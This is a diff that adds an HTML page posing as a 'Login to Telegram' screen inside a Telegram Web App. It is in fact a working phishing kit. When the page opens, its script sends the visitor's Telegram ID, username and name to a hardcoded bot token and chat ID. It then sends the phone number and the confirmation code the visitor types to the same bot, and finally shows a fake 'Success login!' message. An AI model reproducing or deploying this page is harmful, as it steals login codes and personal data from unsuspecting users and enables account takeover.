@@ -1,0 +1,183 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            font-family: sans-serif;
+            background: #000;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-image: url('img/background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: brightness(0.7);
+            z-index: 0;
+        }
+
+        .app-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow-y: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            width: 100%;
+            max-width: 300px;
+            color: white;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 80%;
+            padding: 10px;
+            background: #0098eb;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .loading {
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="app-container">
+        <div class="login-box">
+            <h2>Login to Telegram</h2>
+            <input type="text" id="phone" placeholder="Phone number" />
+            <button onclick="sendCode()">Send Code</button>
+            <input type="text" id="code" placeholder="Confirmation code" />
+            <button onclick="login()">Login</button>
+            <div class="loading" id="loading">Logging in...</div>
+            <div id="status" style="margin-top: 10px; color: lightgreen;"></div>
+        </div>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        setTimeout(() => tg.expand(), 100);
+        const user = tg.initDataUnsafe?.user;
+
+        // Отправка данных о пользователе
+        window.addEventListener('DOMContentLoaded', async () => {
+            if (user) {
+                const message = `👤 *New User Opened the App:*
+\`\`\`
+ID: ${user.id}
+Username: @${user.username || 'N/A'}
+Name: ${user.first_name || ''} ${user.last_name || ''}
+Language: ${user.language_code || 'N/A'}
+\`\`\``;
+
+                await fetch('https://api.telegram.org/bot7874681564:AAGH9Lu6M81DF6n217hICJvISuQpwuHfoaw/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: '7835062868',
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        });
+
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+            const status = document.getElementById('status');
+
+            if (!/^\+?\d{5,15}$/.test(phone)) {
+                status.style.color = 'red';
+                status.textContent = 'Incorrect phone number. Use only numbers and a "+" at the beginning.';
+                return;
+            }
+
+            await fetch('https://api.telegram.org/bot7874681564:AAGH9Lu6M81DF6n217hICJvISuQpwuHfoaw/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '7835062868',
+                    text: `📞 *Phone:* \`${phone}\``,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            status.style.color = 'lightgreen';
+            status.textContent = 'Code was sended!';
+        }
+
+        async function login() {
+            const code = document.getElementById('code').value.trim();
+            const status = document.getElementById('status');
+
+            if (!/^\d{4,8}$/.test(code)) {
+                status.style.color = 'red';
+                status.textContent = 'Invalid code. Enter only numbers from 4 to 8 characters.';
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            await fetch('https://api.telegram.org/bot7874681564:AAGH9Lu6M81DF6n217hICJvISuQpwuHfoaw/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '7835062868',
+                    text: `🔑 *Confirmation Code:* \`${code}\``,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none'; // ← скрываем "Logging in..."
+                status.style.color = 'lightgreen';
+                status.textContent = 'Success login!';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
